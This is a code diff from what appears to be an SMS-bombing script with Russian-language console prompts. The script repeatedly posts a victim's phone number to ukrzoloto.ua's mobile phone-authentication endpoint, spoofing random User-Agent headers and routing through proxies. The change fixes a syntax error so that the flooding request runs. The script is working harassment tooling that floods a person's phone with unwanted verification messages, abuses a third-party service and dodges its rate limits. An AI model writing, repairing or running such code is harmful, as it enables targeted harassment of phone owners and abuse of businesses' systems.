@@ -49,7 +49,7 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
  headers = {"User-Agent": fake_useragent.UserAgent().random}
  try:
-         requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", data={"telephoneNumber": number}}, headers=headers, proxies=proxies)
+         requests.post("https://ukrzoloto.ua/mobile/v1/auth/phone", data={"telephoneNumber": number}, headers=headers, proxies=proxies)
          print('ukrzoloto.ua')
  except:
          print('Не отправлено (ukrzoloto.ua)')
